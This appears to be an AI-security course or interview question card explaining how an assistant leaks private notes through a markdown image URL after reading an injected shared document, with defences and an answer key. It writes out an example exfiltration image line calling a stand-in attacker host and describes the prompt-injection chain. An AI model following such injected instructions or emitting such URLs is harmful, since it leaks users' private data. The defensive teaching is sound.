# Data leaked, but the agent never called a send tool

> Your assistant has no tools that send messages or make HTTP requests. Yet a security researcher shows it leaking a user's private notes to their server after the user asked it to summarise a shared document. How is that possible, and how do you close it?

**Level:** 2
**Type:** Debug
**Time:** ~8 minutes
**Taught in:** 12-safety-and-security/03-data-exfiltration-paths, 12-safety-and-security/02-prompt-injection-direct-indirect

## Short answer

The shared document contained an injection asking the assistant to end its summary with an image like `![](https://attacker.example/x.png?d=<the user's notes>)`. The chat UI rendered the markdown, the browser fetched the image, and the data left in the URL, with no tool call and no click. Close it by restricting what rendered output can fetch: images only from allow-listed domains (enforced in the renderer and by Content Security Policy), show links with their full URL or require a click-through, and scan outputs for URLs containing data seen in private context.

## Full answer

### Egress channels that aren't tools

| Channel | Needs a click? |
|---------|----------------|
| Markdown image in output | No |
| Link in output | Yes |
| HTML (if rendered) | Depends; never render raw model HTML |
| Data in a tool argument that ends up public (titles, comments) | No |

### Defences

1. **Rendering allow-list:** strip or proxy images from unknown hosts. Enforce in code *and* with CSP `img-src`, because model output may reach other renderers.
2. **Link handling:** display the destination; warn on unknown domains.
3. **Content checks:** flag outbound URLs that contain secrets or private values seen this session (also after URL or base64 decoding).
4. **Upstream:** don't mix private data and untrusted documents in one session without these controls.

### Watch the allow-list

Allow-listing a domain where anyone can host content (some file-sharing or form hosts) reopens the channel. The EchoLeak vulnerability in Microsoft 365 Copilot (CVE-2025-32711) used an allowed domain in exactly this way.

## Follow-ups

- **L2.** Why check the domain with an exact or suffix match rather than "contains"? *Expected:* `allowed.com.attacker.example` contains the string; match the host exactly or as a real parent domain.
- **L3.** What do canary tokens add? *Expected:* Fake secrets planted in private data; any outbound appearance is a high-confidence alarm, whatever the channel.
- **L3.** How would you test for this class of bug? *Expected:* Red-team cases with image and link exfiltration, judged by whether the attacker's server received a request containing the canary.

## Wrong answers

- "The model can't access the internet, so it can't leak." The browser rendering its output can.
- "Tell the model not to include images." An injection can override that; enforce in the renderer.
- "Block all external links." Often too blunt for the product; allow-lists and display rules are usually enough.
